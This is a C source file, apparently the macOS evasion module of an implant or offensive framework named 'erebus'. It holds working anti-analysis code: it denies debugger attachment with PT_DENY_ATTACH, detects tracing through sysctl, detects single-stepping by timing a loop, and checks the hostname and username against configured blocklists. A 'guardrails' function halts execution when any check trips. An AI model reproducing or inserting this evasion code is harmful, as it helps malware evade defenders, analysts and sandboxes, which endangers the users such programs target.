#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <mach/mach_time.h>
#include "../../include/config.h"
#include "../../include/evasion.h"

/*
 * PT_DENY_ATTACH tells the BSD debugging layer to deliver SIGSEGV to any
 * process that subsequently calls ptrace(PT_ATTACH) on us.  Must be called
 * before any attaching debugger can set a breakpoint.
 */
void erebus_deny_attach(void)
{
    ptrace(PT_DENY_ATTACH, 0, NULL, 0);
}

/*
 * sysctl(KERN_PROC_PID) returns a kinfo_proc whose p_flag field contains
 * P_TRACED (0x800) when a debugger is attached.
 */
int erebus_check_debug(void)
{
    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_PID, (int)getpid() };
    struct kinfo_proc info;
    size_t size = sizeof(info);
    if (sysctl(mib, 4, &info, &size, NULL, 0) != 0)
        return 0;
    return (info.kp_proc.p_flag & P_TRACED) != 0;
}

/*
 * Spin for a fixed instruction count and measure elapsed time via
 * mach_absolute_time.  Single-stepping inflates the delta well beyond
 * the 500 ms threshold used here.
 */
int erebus_check_timing(void)
{
    uint64_t t1 = mach_absolute_time();
    volatile int x = 0;
    for (int i = 0; i < 2000000; i++) x += i;
    uint64_t t2 = mach_absolute_time();

    mach_timebase_info_data_t tb;
    mach_timebase_info(&tb);
    uint64_t elapsed_ns = (t2 - t1) * tb.numer / tb.denom;
    return elapsed_ns > 500000000ULL; /* > 500 ms */
}

int erebus_check_hostname(const char **blocked, int count)
{
    char hostname[256] = {0};
    if (gethostname(hostname, sizeof(hostname) - 1) != 0)
        return 0;
    for (int i = 0; i < (int)strlen(hostname); i++)
        if (hostname[i] >= 'A' && hostname[i] <= 'Z')
            hostname[i] += 32;
    for (int i = 0; i < count; i++)
        if (strstr(hostname, blocked[i])) return 1;
    return 0;
}

int erebus_check_username(const char **blocked, int count)
{
    const char *user = getenv("USER");
    if (!user) user  = getenv("LOGNAME");
    if (!user) return 0;
    char uname[256] = {0};
    strncpy(uname, user, sizeof(uname) - 1);
    for (int i = 0; i < (int)strlen(uname); i++)
        if (uname[i] >= 'A' && uname[i] <= 'Z')
            uname[i] += 32;
    for (int i = 0; i < count; i++)
        if (strstr(uname, blocked[i])) return 1;
    return 0;
}

int erebus_guardrails_check(void)
{
#if CONFIG_CHECK_DEBUG
    if (erebus_check_debug()) return 0;
#endif

#if CONFIG_CHECK_TIMING
    if (erebus_check_timing()) return 0;
#endif

#ifdef CONFIG_BLOCKED_HOSTNAMES
    {
        static const char *_bh[] = CONFIG_BLOCKED_HOSTNAMES;
        int _n = (int)(sizeof(_bh) / sizeof(_bh[0]));
        if (erebus_check_hostname(_bh, _n)) return 0;
    }
#endif

#ifdef CONFIG_BLOCKED_USERNAMES
    {
        static const char *_bu[] = CONFIG_BLOCKED_USERNAMES;
        int _n = (int)(sizeof(_bu) / sizeof(_bu[0]));
        if (erebus_check_username(_bu, _n)) return 0;
    }
#endif

    return 1;
}
